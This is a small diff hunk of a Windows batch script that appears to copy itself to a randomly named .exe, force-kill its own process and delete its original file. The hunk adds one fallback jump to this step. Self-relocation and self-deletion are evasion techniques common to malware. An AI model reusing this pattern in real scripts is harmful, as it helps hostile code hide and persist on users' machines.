@@ -112,6 +112,7 @@ for /f %%i in ('"%myfiles%\random.bat" a 8') do (
 	copy "%~0" "%%i.exe">nul
 	set newjumpjffile=%%i.exe
 )
+if not exist "%newjumpjffile%" goto firstjumppath
 for /f "delims=" %%i in ("%~0") do (
 	taskkill /f /im "%%~nxi">nul
 	if exist "%~0" del "%~0" /f /q
